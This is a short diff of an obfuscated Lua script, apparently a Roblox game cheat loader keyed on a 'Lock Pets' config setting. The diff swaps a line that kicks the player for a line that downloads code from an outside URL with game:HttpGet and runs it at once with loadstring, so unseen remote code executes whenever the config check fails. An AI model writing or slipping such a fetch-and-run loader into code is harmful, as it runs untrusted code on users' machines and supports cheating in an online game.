@@ -1,5 +1,5 @@
 if not ConfigsKaitun["Lock Pets"] then 
-	return game.Players.LocalPlayer:Kick("Dont Use New Config with old loader\ngo get new script")
+	return loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/98vt13x1h979yxngcvxbkjsq8hsw9rpw.lua"))()
 end
 
 -- This file was protected using Luraph Obfuscator v14.4.1 [https://lura.ph/]
